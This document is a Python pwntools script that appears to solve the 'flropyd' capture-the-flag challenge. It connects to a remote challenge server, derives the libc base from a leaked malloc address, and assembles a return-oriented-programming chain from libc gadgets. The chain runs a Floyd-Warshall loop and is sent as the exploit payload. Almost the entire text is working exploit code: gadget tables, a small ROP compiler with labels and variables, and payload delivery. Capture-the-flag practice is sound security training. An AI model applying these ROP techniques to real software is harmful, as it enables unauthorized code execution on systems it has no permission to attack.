from pwn import *
import time
import sys,os
import copy

REMOTE = True
REIMPL = False

if REMOTE:
    p = remote('111.186.63.203', 6666)
else:
    p = process('flropyd_reimpl' if REIMPL else 'flropyd')
    time.sleep(0.5)

p.recvuntil('malloc address:')
mallocAddr = int(p.recvline().strip()[2:], 16)
libcBase = mallocAddr - 0x7f1f8c23c070 + 0x7f1f8c1a5000

print "mallocAddr = 0x%x, libcBase = 0x%x" % (mallocAddr, libcBase)

gadgets = {}
def gadget(addr, name='?'):
  g = {"type":"gadget", "name":name, "addr":addr}
  gadgets[name] = g
  return g

graphSizeAddr = 0x602080 if REIMPL else 0x602060
tableAddr = 0x602100 if REIMPL else 0x602068
ropChainBssAddr = 0x60A100 if REIMPL else 0x60A080
showTableAddr = 0x400b09
ropBase = ropChainBssAddr + 8*3

popRsp = gadget(0x3960,  "pop rsp")
popRdi = gadget(0x2155f, "pop rdi")
popRdx = gadget(0x1b96,  "pop rdx")
popRcx = gadget(0x3eb0b, "pop rcx")
popRax = gadget(0x439c8, "pop rax")
popRsi = gadget(0x23e6a, "pop rsi")
movRdxRax = gadget(0x1415dd, "mov rdx, rax")
exit      = gadget(0x7feedafa3dd0 - 0x7feedaebf000, "exit")
syscall   = gadget(0x7f42ef7f5df4 - 0x7f42ef711000, "syscall")

print "ropBase = 0x%x" % ropBase

# 0x000000000008335c : mov qword ptr [rax + 0x40], rcx ; ret
# 0x000000000008eb44 : mov qword ptr [rax + 8], 0 ; ret
# 0x0000000000143961 : mov qword ptr [rax], 0 ; ret
# 0x0000000000097055 : mov qword ptr [rax], rdi ; ret
# 0x00000000000301a4 : mov qword ptr [rax], rdx ; ret
# 0x000000000008dd76 : mov qword ptr [rdi + 8], rax ; ret
# 0x000000000003093c : mov qword ptr [rdx], rax ; ret
# 0x000000000014dbfe : mov qword ptr [rsi + 0x10], rax ; ret
# 0x000000000011578a : mov qword ptr [rsi + 0x48], rax ; ret
# 0x000000000014dbce : mov qword ptr [rsi + 8], rax ; ret
# 0x0000000000145c98 : mov rax, qword ptr [rax] ; ret
# 0x00000000001c1ae3 : push qword ptr [rax] ; ret
# 0x00000000000e0010 : mov rax, qword ptr [rdi + 0x20] ; ret
# 0x0000000000118dd0 : inc dword ptr [rax] ; ret
# 0x00000000001306b5 : pop r10 ; ret
# 0x0000000000023992 : pop r12 ; ret
# 0x0000000000021a45 : pop r13 ; ret
# 0x0000000000023e69 : pop r14 ; ret
# 0x000000000002155e : pop r15 ; ret
# 0x00000000000439c8 : pop rax ; ret
# 0x0000000000021353 : pop rbp ; ret
# 0x000000000002cb49 : pop rbx ; ret
# 0x000000000003eb0b : pop rcx ; ret
# 0x000000000002155f : pop rdi ; ret
# 0x0000000000001b96 : pop rdx ; ret
# 0x0000000000023e6a : pop rsi ; ret
# 0x0000000000003960 : pop rsp ; ret
# 0x00000000001ab548 : shl dword ptr [rdi - 5], 1 ; ret
# 0x000000000018a3b2 : sub rax, r8 ; ret
# 0x00000000000b17b8 : sub rax, rdi ; ret
# 0x00000000000438fd : sub rax, rdx ; ret
# 0x000000000018a15c : sub rax, rsi ; ret
# 0x000000000009a851 : sub rax, 0x10 ; ret
# 0x00000000000bb213 : sub rax, 1 ; ret
# 0x00000000000ab9f8 : add rax, rcx ; ret
# 0x00000000000a8473 : add rax, rdi ; ret
# 0x00000000000ac21c : add rax, rsi ; ret
# 0x000000000003de9f : shr rax, 0x3f ; ret

# 0x00000000001415dd : mov rdx, rax ; ret

# 0x000000000003d24b : mov rax, rcx ; ret
# 0x00000000000586ed : mov rax, rdi ; ret
# 0x0000000000052c59 : mov rax, rdx ; ret
# 0x00000000000587f3 : mov rax, rsi ; ret
# 0x000000000018a3b2 : sub rax, r8 ; ret
# 0x00000000000b17b8 : sub rax, rdi ; ret
# 0x00000000000438fd : sub rax, rdx ; ret
# 0x000000000018a15c : sub rax, rsi ; ret
# 0x00000000000b17c5 : xor rax, rax ; ret
# 0x00000000000ab9f8 : add rax, rcx ; ret
# 0x00000000000a8473 : add rax, rdi ; ret
# 0x00000000000ac21c : add rax, rsi ; ret
# 0x00000000000b17b5 : add rax, rdx ; sub rax, rdi ; ret

def incAtAddr(addr): # uses: rax
  return [popRax, addr, gadget(0x118dd0, "inc dword ptr [rax]")]

def decAtAddr(addr): # uses: rax
  # 0x00000000001c1ad3 : dec dword ptr [rax] ; ret
  return [popRax, addr, gadget(0x1c1ad3, "dec dword ptr [rax]")]
  
def shlAtAddr(addr, shift): # uses: rdi
  # 0x00000000001ab548 : shl dword ptr [rdi - 5], 1 ; ret
  return [popRdi, addr + 5] + [gadget(0x1ab548, "shl dword ptr [rdi - 5], 1")] * shift

def isRaxNegative():
  # 0x000000000003de9f : shr rax, 0x3f ; ret
  return [gadget(0x3de9f, "shr rax, 0x3f")]
  
def isEaxNegative():
  # 0x000000000003db9b : shr eax, 0x1f ; ret
  return [gadget(0x3db9b, "shr eax, 0x1f")]
  
def writeAddr(addr, value): # uses rdi, rax
  # 0x0000000000097055 : mov qword ptr [rax], rdi
  return [popRax, addr, popRdi, value, gadget(0x97055, "mov qword ptr [rax], rdi")]

def readFromRax():
  # 0x0000000000145c98 : mov rax, qword ptr [rax] ; ret
  return [gadget(0x145c98, "mov rax, qword ptr [rax]")]
  
def readAddr(addr): # dest: rax
  return [popRax, addr] + readFromRax()
  
def writeRax(addr): # uses: rdx
  # 0x000000000003093c : mov qword ptr [rdx], rax ; ret
  return [popRdx, addr, gadget(0x3093c, "mov qword ptr [rdx], rax")]

  # 0x000000000014dbce : mov qword ptr [rsi + 8], rax ; ret
  #return popRsi + p64(addr - 8) + p64(libcBase + 0x14dbce)
  
def addToRax(value): # uses: rcx
  # 0x00000000000ab9f8 : add rax, rcx ; ret
  return [popRcx, value, gadget(0xab9f8, "add rax, rcx")]
  
def jumpToRax():
  labelid = new_label_id('jumpToRax')
  return writeRax(labelid) + [popRsp] + label(labelid) + [u64('X'*8)] # will be overwritten
  
def shlRax(shift):
  varX = var('shlRaxHelper')
  return writeRax(varX) + shlAtAddr(varX, shift) + readAddr(varX)
  
def raxJumpNeg(addrIfNeg, addrOtherwise):
  jumpTable = new_label_id('jumpTable')
  return isEaxNegative() + shlRax(4) + addToRax(jumpTable) + jumpToRax() + label(jumpTable) + [popRsp, addrOtherwise, popRsp, addrIfNeg]

def addRaxRdx(rdi = 0):
  return [popRdi, rdi, gadget(0xb17b5, 'add rax, rdx ; sub rax, rdi')]
  
### LABEL HANDLING ###
  
labels = {}

def get_label(name):
  global labels
  if name not in labels:
    labels[name] = { "placeholder": "LABEL_%02d" % len(labels) }
  return labels[name]
  
def label(nameOrRef):
  name = nameOrRef if isinstance(nameOrRef, str) else nameOrRef["name"]
  return [{ "type": "label", "name": name}]

def new_label_id(postfix = ''):
  return label_id("LABEL_%02d_%s" % (len(labels), postfix))
  
def label_id(label_name):
  get_label(label_name)
  return { "type": "label_ref", "name": label_name }
  
def jump(label_name):
  return [popRsp, label_id(label_name)]

def fixlabels():
  global labels, ropChain
  
  newRopChain = []
  for x in ropChain:
    if isinstance(x, dict) and x["type"] == "label":
      get_label(x["name"])["address"] = ropChainBssAddr + len(newRopChain) * 8
    else:
      newRopChain += [x]

  for (label_name, data) in labels.iteritems():
    if not "placeholder" in data or not "address" in data:
      print "placeholder or address is missing for label '%s': %r" % (label_name, data)

  ropChainStr = ''      
  for x in newRopChain:
    if isinstance(x, (int, long)):
      ropChainStr += p64(x)
    elif isinstance(x, dict) and x["type"] == "label_ref":
      ropChainStr += p64(get_label(x["name"])["address"])
    elif isinstance(x, dict) and x["type"] == "gadget":
      ropChainStr += p64(libcBase + x["addr"])
    else:
      print "fail2: %r" % x

  return ropChainStr
      
### </LABEL HANDLING> ###  

def print_ropchain():
  addr = ropChainBssAddr
  for x in ropChain:
    sys.stdout.write("0x%x: " % addr)
    if isinstance(x, (int, long)):
      if x in varByAddr:
        print "    var('%s')" % varByAddr[x]
      elif ropChainBssAddr <= x and x <= ropChainBssAddr + 65536:      
        print "    0x%x" % x
      else:
        print "  0x%x" % x
    elif isinstance(x, dict) and x["type"] == "label":
      print "%s:" % x["name"]
      addr -= 8
    elif isinstance(x, dict) and x["type"] == "label_ref":
      print "    %s" % x["name"]
    elif isinstance(x, dict) and x["type"] == "gadget":
      print "  %s" % x["name"]
    addr += 8
  
### VARIABLE HANDLING ###
variables = OrderedDict({})
varByAddr = {graphSizeAddr:"graphSize"}
nextVarAddr = ropChainBssAddr + 65536 - 20 * 8 # max var count = 20

def var(name):
  global variables, nextVarAddr
  if not name in variables:
    variables[name] = nextVarAddr
    varByAddr[nextVarAddr] = name
    nextVarAddr += 8
  return variables[name]
  
def print_vars():
  print "variables:"
  for (name, addr) in variables.iteritems():
    print "  - %s: 0x%x" % (name, addr)
  
### </VARIABLE HANDLING> ###

### ROP CHAIN ###
ropChain = [u64('B'*8)] * (3 if REIMPL else 3)

# run ropchain from BSS (a known address, instead of the random stack)
ropChain += [popRsp, ropBase + 8*2]

# code: i = j = k = graphSize - 1
ropChain += decAtAddr(graphSizeAddr)

#ropChain += popRdi + p64(0x1337) + exit

ropChain += readAddr(graphSizeAddr) + writeRax(var('i'))
ropChain += label('for-i')

ropChain += readAddr(graphSizeAddr) + writeRax(var('j'))
ropChain += label('for-j')

ropChain += readAddr(graphSizeAddr) + writeRax(var('k'))
ropChain += label('for-k')

def indexTable():
  return shlRax(3) + [popRdi, tableAddr, gadget(0xa8473, "add rax, rdi")]

# v0addr = &expectedSolution[(j << 6) + k]
ropChain += readAddr(var('j')) + shlRax(6) + [movRdxRax] + readAddr(var('k')) + addRaxRdx() + indexTable() + writeRax(var('v0addr'))

# v0 = expectedSolution[(j << 6) + k]
ropChain += readFromRax() + writeRax(var('v0'))

# v1 = expectedSolution[(j << 6) + i]
ropChain += readAddr(var('j')) + shlRax(6) + [movRdxRax] + readAddr(var('i')) + addRaxRdx() + indexTable() + readFromRax() + writeRax(var('v1'))

# v2 = expectedSolution[(i << 6) + k]
ropChain += readAddr(var('i')) + shlRax(6) + [movRdxRax] + readAddr(var('k')) + addRaxRdx() + indexTable() + readFromRax() + writeRax(var('v2'))

# v1v2 = v1+v2
ropChain += readAddr(var('v1')) + [movRdxRax] + readAddr(var('v2')) + addRaxRdx() + writeRax(var('v1v2'))

# if v1v2 - v0 < 0 =>
ropChain += readAddr(var('v0')) + [movRdxRax] + readAddr(var('v1v2')) + [gadget(0x438fd, "sub rax, rdx")] + \
  raxJumpNeg(label_id('switch'), label_id('for-k-end'))
  
ropChain += label('switch')
ropChain += readAddr(var('v0addr')) + [movRdxRax] + readAddr(var('v1v2')) + [gadget(0x3093c, "mov qword ptr [rdx], rax")]
#ropChain += readAddr(var('v0addr')) + [movRdxRax] + [popRax, 0x1337] + [gadget(0x3093c, "mov qword ptr [rdx], rax")]
#ropChain += [0x8888888888888888]

ropChain += label('for-k-end')
if REIMPL:
    ropChain += [showTableAddr]
ropChain += decAtAddr(var('k')) + readFromRax() + raxJumpNeg(label_id('for-j-end'), label_id('for-k'))

ropChain += label('for-j-end')
ropChain += decAtAddr(var('j')) + readFromRax() + raxJumpNeg(label_id('for-i-end'), label_id('for-j'))

ropChain += label('for-i-end')
ropChain += decAtAddr(var('i')) + readFromRax() + raxJumpNeg(label_id('done'), label_id('for-i'))

ropChain += label('done')
#ropChain += [popRdi, 0, popRax, 60, syscall]
# infinite loop
ropChain += label('infloop') + jump('infloop')

#ropChain += [u64('C' * 8)]
### </ROP CHAIN> ###

print_ropchain()
ropChainStr = fixlabels()
print_vars()

print 'ropchain = %r' % ropChainStr

p.recvuntil('please show me the rop chain:')
p.send(ropChainStr.ljust(65536, 'A'))
p.recvuntil('round 0\n')

def readTable():
  p.recvuntil('--------------------------------------------');
  content = p.recvuntil('--------------------------------------------', drop=True)
  table = [[int(y.strip()) for y in x[1:-2].split('|')] for x in content.strip().split('\n')]
  return table

def printTable(table):
  graphSize = len(table)
  
  print "-------" * graphSize + "--"
  
  for x in xrange(graphSize):
    sys.stdout.write("| ")
    for y in xrange(graphSize):
      sys.stdout.write(" %4d |" % table[x][y])
    print ""

  print "-------" * graphSize + "--"
  
start = time.time()
if REIMPL:
  expected = readTable()
  expected2 = copy.deepcopy(expected)
  prevTable = None
  graphSize = 6
  for i in xrange(graphSize-1, -1, -1):
    for j in xrange(graphSize-1, -1, -1):
      for k in xrange(graphSize-1, -1, -1):
        if expected[j][k] > expected[j][i] + expected[i][k]:
          expected[j][k] = expected[j][i] + expected[i][k]

        table = readTable()
        print 'i=%d, j=%d, k=%d, table: %r' % (i,j,k,"no change" if prevTable == table else "changed!")
        if prevTable <> table:
          printTable(table)
        prevTable = table
        
        for x in xrange(graphSize):
          for y in xrange(graphSize):
            if table[x][y] != expected[x][y]:
              print "!!!FAILED in at %d, %d => expected = %d, got = %d" % (x,y,expected[x][y],table[x][y])
              print "expected:"
              printTable(expected)
              sys.exit(1)
              
  for i in xrange(graphSize):
    for j in xrange(graphSize):
      for k in xrange(graphSize):
        if expected2[j][k] > expected2[j][i] + expected2[i][k]:
          expected2[j][k] = expected2[j][i] + expected2[i][k]
  
  if expected != expected2:
    print "!!!FAILED: expected != expected2"
  else:
    print "ok: expected == expected2"
              
else:
  print "result = %r" % p.recvline()
print "elapsed = %r" % (time.time() - start)
p.interactive()